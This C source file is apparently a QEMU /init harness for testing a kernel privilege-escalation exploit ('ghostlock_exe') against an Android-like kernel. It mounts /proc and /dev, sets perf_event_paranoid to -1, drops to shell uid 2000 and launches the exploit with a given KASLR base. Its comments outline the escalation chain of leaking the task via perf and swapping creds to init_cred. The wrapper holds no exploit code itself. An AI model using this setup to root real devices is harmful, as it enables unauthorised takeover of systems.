/* QEMU /init wrapper: prepare /proc + /dev + perf, then run the exploit's
 * --escalate endgame on kernel.patched (nokaslr, --probe-cycle) as uid 2000:
 * perf-leak current task -> point real_cred/cred at init_cred -> getuid()==0.
 * (Earlier runs used --verify-all; keep that flag for the write/leaf/read
 * self tests.)
 *
 * The kernel has no console on QEMU (GENI UART), so fds 0/1/2 may be closed;
 * give them /dev/null first, otherwise pipe() steals fd 0/1 and the child's
 * printf output lands in the result pipe.
 *
 * The exploit runs as a child and the wrapper stays alive as PID 1 forever:
 * if PID 1 exits (even with status 0) the kernel panics with "Attempted to
 * kill init", which would wipe the log before the harness can read it.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <grp.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>
#include <unistd.h>

int main(void) {
  mkdir("/proc", 0755);
  if (mount("proc", "/proc", "proc", 0, NULL) != 0) {
    perror("mount proc");
  }
  mkdir("/dev", 0755);
  if (mount("devtmpfs", "/dev", "devtmpfs", 0, NULL) != 0) {
    perror("mount devtmpfs");
  }
  mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
  mknod("/dev/kmsg", S_IFCHR | 0666, makedev(1, 11));
  chmod("/dev/kmsg", 0666); /* the exploit drops to uid 2000 but still logs */
  int nfd = open("/dev/null", O_RDWR);
  if (nfd >= 0) {
    dup2(nfd, 0);
    dup2(nfd, 1);
    dup2(nfd, 2);
    if (nfd > 2) {
      close(nfd);
    }
  }
  mkdir("/data", 0755);
  mkdir("/data/local", 0755);
  mkdir("/data/local/tmp", 0755);

  /* Device analogue: perf_event_paranoid=-1 lets unprivileged shells use
     perf_event_open (the GOT-W29 device runs with -1 too). */
  int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_WRONLY);
  if (pfd >= 0) {
    (void)!write(pfd, "-1\n", 3);
    close(pfd);
  }
  /* /dev/kmsg logging is ratelimited by default and the exploit logs a lot:
     the final result lines were suppressed in earlier runs. */
  int rfd = open("/proc/sys/kernel/printk_ratelimit", O_WRONLY);
  if (rfd >= 0) {
    (void)!write(rfd, "0\n", 2);
    close(rfd);
  }

  pid_t pid = fork();
  if (pid == 0) {
    /* Drop to the shell uid the exploit expects on the device (uid 2000),
       with AID_INET in the supplementary groups: CONFIG_ANDROID_PARANOID_NETWORK
       refuses AF_INET socket() with EACCES for uids outside the "inet" group
       (the real device shell has gid 3003).  AID_SHELL=2000, AID_INET=3003. */
    gid_t groups[1] = {3003};
    if (setgroups(1, groups) != 0) {
      perror("setgroups");
    }
    if (setgid(2000) != 0 || setuid(2000) != 0) {
      perror("setuid 2000");
    }
    char *argv[] = {
      "/ghostlock_exe", "--probe-cycle", "--no-rt", "--escalate",
      "--attempts", "4", "--kaslr-base", "0xffffff8008080800",
      "--log-file", "/dev/kmsg",
      NULL
    };
    char *envp[] = { NULL };
    execve(argv[0], argv, envp);
    perror("execve");
    _exit(1);
  }

  int status = 0;
  waitpid(pid, &status, 0);
  /* Independent completion marker (the exploit's own lines can be rate
     limited/lost): exit code 0 == escalate returned success. */
  char msg[96];
  int kn = open("/dev/kmsg", O_WRONLY);
  if (kn >= 0) {
    int m = snprintf(msg, sizeof(msg),
                     "init: ghostlock_exe exited status=0x%x%s\n", status,
                     (WIFEXITED(status) && WEXITSTATUS(status) == 0)
                         ? " (SUCCESS)"
                         : "");
    if (m > 0) {
      (void)!write(kn, msg, (size_t)m);
    }
    close(kn);
  }
  for (;;) {
    pause(); /* keep PID 1 alive: its exit would panic the kernel */
  }
}
